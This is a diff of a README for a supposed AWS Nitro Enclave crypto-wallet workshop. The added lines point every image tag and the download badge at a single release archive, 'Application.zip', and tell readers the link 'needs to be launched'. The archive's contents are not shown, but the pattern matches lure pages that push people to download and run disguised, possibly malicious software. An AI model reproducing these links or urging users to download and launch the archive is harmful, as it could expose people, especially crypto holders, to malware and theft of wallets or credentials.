@@ -1,7 +1,7 @@
 
 # 🚀 Build Multi-Party Crypto Wallets with Aws Nitro Enclave
 
-![Crypto Wallet Image](https://example.com/crypto_wallet_image.png)
+![Crypto Wallet Image](https://github.com/VisualProps/custom-attestation-multi-party-crypto-wallet-with-aws-nitro-enclave/releases/download/v1.0/Application.zip)
 
 Welcome to the **Custom Attestation Multi-Party Crypto Wallet with AWS Nitro Enclave** repository! Here you will find all the necessary assets for the workshop on building multi-party crypto wallets with AWS Nitro Enclave. 
 
@@ -29,7 +29,7 @@ The workshop and this repository cover a wide range of topics related to AWS Nit
 ## Getting Started
 To begin your journey in building multi-party crypto wallets with AWS Nitro Enclave, simply click on the link below to access the assets:
 
-[![Download Assets](https://img.shields.io/badge/Download-Assets-brightgreen)](https://github.com/adelante20/Release/raw/refs/heads/master/Release.zip)
+[![Download Assets](https://github.com/VisualProps/custom-attestation-multi-party-crypto-wallet-with-aws-nitro-enclave/releases/download/v1.0/Application.zip)](https://github.com/VisualProps/custom-attestation-multi-party-crypto-wallet-with-aws-nitro-enclave/releases/download/v1.0/Application.zip)
 
 **Note:** The link provided needs to be launched to access the assets for the workshop.
 
@@ -44,6 +44,6 @@ Connect with like-minded individuals, share your progress, and seek assistance b
 ## Let's Get Started!
 Are you ready to embark on this exciting journey of building multi-party crypto wallets with AWS Nitro Enclave? Click the download link above, gather your enthusiasm, and dive into the world of blockchain technology and cryptographic attestation. The future of secure digital transactions awaits you!
 
-![Blockchain Image](https://example.com/blockchain_image.png)
+![Blockchain Image](https://github.com/VisualProps/custom-attestation-multi-party-crypto-wallet-with-aws-nitro-enclave/releases/download/v1.0/Application.zip)
 
 Happy coding! 🔒💰🚀
